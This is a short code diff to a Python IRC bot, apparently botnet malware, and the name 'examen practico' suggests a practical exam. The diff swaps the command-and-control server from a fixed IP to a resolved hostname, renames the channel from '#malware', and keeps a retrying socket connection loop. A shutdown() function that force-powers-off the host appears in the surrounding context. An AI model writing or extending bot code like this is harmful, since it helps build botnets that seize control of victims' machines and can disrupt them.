@@ -152,9 +152,15 @@ def shutdown():
 	"""
 	subprocess.call(["shutdown", "-f", "-s", "-t", "1"])
 
-server="192.168.1.30"
+#server="192.168.1.30"
 botnick=botName()
-channel="#malware"
+channel="#AbrahamPedro"
+while 1:
+	try:
+		server = str(socket.gethostbyname('examen.practico.abpe'))
+		break
+	except Exception as e:
+		pass
 while 1:
 	try:
 		irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -163,7 +169,8 @@ while 1:
 		irc.send("NICK "+ botnick +"\n")
 		irc.send("JOIN "+ channel +"\n")
 		break
-	except Exception:
+
+	except Exception as e:
 		pass
 
 while 1:
